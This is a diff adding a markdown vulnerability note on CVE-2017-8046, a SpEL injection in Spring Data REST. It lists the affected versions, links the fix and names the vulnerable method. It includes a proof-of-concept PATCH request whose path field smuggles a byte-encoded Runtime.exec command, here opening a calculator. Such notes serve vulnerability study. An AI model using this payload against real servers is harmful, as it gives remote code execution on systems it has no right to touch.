@@ -224,3 +224,28 @@ public void setPropertyValue(String propertyName, @Nullable Object value) throws
     }
 }
 ```
+## Spring Data Rest
+### CVE-2017-8046 SpEL
+Affected Version: < 2.5.12 or 2.6.7 or 3.0 RC3  
+Diff: https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45  
+POC: 
+```
+// Create User
+POST /people HTTP/1.1
+Content-Type:application/json
+
+{"firstName":"san","lastName":"zhang"}
+
+// Patch, modify user info
+PATCH /people/1 HTTP/1.1
+Content-Type:application/json-patch+json
+
+[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))/lastName", "value": "hacker" }]
+```
+Factor: 
+```
+PatchOperation
+protected void setValueOnTarget(Object target, Object value) {
+    this.spelExpression.setValue(target, value);
+}
+```
